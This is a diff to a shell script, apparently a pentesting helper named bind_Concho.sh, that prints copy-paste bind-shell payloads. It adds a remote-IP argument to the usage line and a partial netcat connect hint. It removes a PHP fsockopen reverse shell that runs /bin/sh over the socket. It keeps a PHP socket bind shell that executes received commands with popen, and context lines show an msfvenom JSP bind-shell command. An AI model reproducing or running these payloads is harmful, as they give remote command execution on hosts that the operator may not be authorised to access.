@@ -15,7 +15,7 @@ NC='\033[0m'
 
 # Display error if not enough arguments given
 if [ $# -ne 1 ]; then
-	printf " ${RED}Usage: ${NC} ./bind_Concho.sh [remote_listen_port] \n"
+	printf " ${RED}Usage: ${NC} ./bind_Concho.sh [remote machine ip] [remote_listen_port] \n"
 	exit 1
 fi
 
@@ -64,9 +64,6 @@ printf ".-------------------------------.\n\n"
 
 
 printf ".. PHP CLI Bind Shell ..\n.-------------------------------.\n"
-printf "php -r '\$sock=fsockopen(\"$1\",\"$2\");exec(\"/bin/sh -i <&3 >&3 2>&3\");\'\n"
-
-
 printf "php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$s,\"0.0.0.0\",$1);socket_listen(\$s,1);\$cl=socket_accept(\$s);while(1){if(!socket_write(\$cl,\"\$ \",2))exit;\$in=socket_read(\$cl,100);\$cmd=popen(\"\$in\",\"r\");while(!feof(\$cmd)){\$m=fgetc(\$cmd);socket_write(\$cl,\$m,strlen(\$m));}}'\n"
 
 printf ".-------------------------------.\n\n"
@@ -98,4 +95,6 @@ printf "msfvenom -p java/jsp_shell_bind_tcp LPORT=$1 exitfunc=thread -f war \n\n
 printf ".-------------------------------.\n\n\n"
 
 unset conchofilename
+
+printf "When ready, connect with...\n nc "
 
